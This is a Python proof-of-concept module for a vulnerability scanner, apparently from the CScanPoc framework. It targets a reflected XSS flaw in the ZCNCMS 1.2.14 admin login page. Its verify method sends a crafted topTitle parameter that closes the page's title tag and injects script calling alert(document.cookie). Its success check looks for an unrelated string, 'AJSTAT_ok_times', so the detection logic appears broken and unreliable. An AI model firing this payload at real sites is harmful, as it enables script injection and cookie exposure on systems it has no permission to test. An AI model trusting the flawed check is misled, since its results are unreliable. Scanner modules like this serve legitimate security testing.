# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'ZCNCMS_0003'  # 平台漏洞编号，留空
    name = 'ZCNCMS 反射型XSS'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2016-08-25'  # 漏洞公布时间
    desc = '''
        zcncms是站长中国基于php技术开发的内容管理系统。
        在后台登陆文件 /include/admincontroller/login.php中，进行登陆是否成功后，设置模板文件为’login.tpl.php’.
        在<title>标签中要echo三个变量，其中会检查$topTitle是否为空，我们再控制器文件login.php中并未找到$topTitle的定义或初始化，由于之前参数输入特性，可以进行变量覆盖。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4062/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ZCNCMS'  # 漏洞应用名称
    product_version = '1.2.14'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6d6d9f92-6387-4b1f-ba1f-de0b4e1d2d9c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/zcncms/admin/?c=login&topTitle=</title><script>alert(document.cookie)</script><script type="mce-no/type">// <![CDATA[ alert(document.cookie) // ]]></script>'
            url = self.target + payload
            r = requests.get(url)

            if 'AJSTAT_ok_times' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
